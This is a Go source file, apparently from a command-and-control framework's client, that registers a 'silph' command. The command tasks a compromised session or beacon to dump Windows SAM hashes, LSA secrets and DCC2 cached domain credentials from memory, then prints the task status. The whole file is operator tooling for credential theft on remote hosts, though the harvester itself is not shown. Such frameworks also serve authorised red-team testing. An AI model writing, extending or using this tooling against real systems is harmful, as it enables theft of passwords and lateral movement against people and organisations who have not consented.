package grumblecli

import (
	"fmt"

	"github.com/desertbit/grumble"
	"google.golang.org/grpc"

	"orsted/client/clientrpc"
)

func SetSilphCommand(conn grpc.ClientConnInterface) {
	silphCmd := &grumble.Command{
		Name: "silph",
		Help: "SILPH - Stealthy In-memory Local Password Harvester",
		Flags: func(f *grumble.Flags) {
			f.Bool("s", "sam", false, "dump SAM")
			f.Bool("l", "lsa", false, "dump LSA")
			f.Bool("d", "dcc2", false, "dump DCC2")
		},
		Run: func(c *grumble.Context) error {
			if SelectedSession == nil {
				fmt.Println("No session selected. Use interact command to specify session")
				return nil
			}
			//TODO Add space check
			var sam bool = c.Flags.Bool("sam")
			var lsa bool = c.Flags.Bool("lsa")
			var dcc2 bool = c.Flags.Bool("dcc2")

			samInt := map[bool]int{false: 0, true: 1}[sam]
			lsaInt := map[bool]int{false: 0, true: 1}[lsa]
			dcc2Int := map[bool]int{false: 0, true: 1}[dcc2]

			command := fmt.Sprintf("silph %d %d %d", samInt, lsaInt, dcc2Int)
			prettyCommand := "silph"
			if sam {
				prettyCommand += " "
				prettyCommand += "--sam"
			}
			if lsa {
				prettyCommand += " "
				prettyCommand += "--lsa"
			}
			if dcc2 {
				prettyCommand += " "
				prettyCommand += "--dcc2"
			}
			res, err := clientrpc.AddTaskFunc(conn, SelectedSession.Id, command, nil, prettyCommand)
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			var data [][]string
			data = append(data, []string{
				res.TaskId,
				res.BeacondId,
				res.State,
				string(res.Command),
			})
			prettyPrint(data, []string{"TASKID", "SESSIONID", "STATE", "COMMAND"}, c.App.Stdout())
			return nil
		},
	}

	app.AddCommand(silphCmd)
}
